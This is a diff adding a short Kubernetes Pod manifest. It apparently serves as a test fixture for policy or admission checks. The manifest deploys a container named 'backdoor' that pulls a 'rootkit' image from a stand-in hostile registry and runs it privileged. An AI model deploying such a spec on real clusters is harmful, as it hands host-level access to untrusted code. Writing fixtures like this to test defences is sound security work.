@@ -1,0 +1,10 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: malicious-untrusted-image
+spec:
+  containers:
+  - name: backdoor
+    image: malicious-registry.com/rootkit:latest
+    securityContext:
+      privileged: true
